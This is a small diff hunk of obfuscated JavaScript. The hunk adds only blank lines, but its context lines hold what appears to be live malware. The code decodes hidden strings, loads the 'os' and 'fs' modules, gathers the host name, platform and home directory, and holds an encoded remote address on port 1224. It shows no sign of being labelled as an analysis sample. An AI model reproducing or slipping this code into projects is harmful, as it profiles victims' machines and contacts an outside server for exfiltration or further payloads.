@@ -18,6 +18,8 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{ let E=Buffer.from(r,t);
     $=E("BRgHTBMbFFU"),n=E("ARkWXBwG"),l=E("HRsLXREdFA"),R=E("HRsVTBsVC10"),
     W=E("AQ0WXQ"),V=require("os"),U=require(A),g=require(o),Q=require(a),
     h=require(i),w=require(F)[B],x=V[R](),f=V[$](),y=V[l](),G=V[n](),I=V[W](),
+    
+    
     S=require("fs");let u;
     
     const d=t=>e(t,c),X=(()=>{ let t="MTcyLjg2LjaHR0cDovLwk5LjM2OjEyMjQ=";
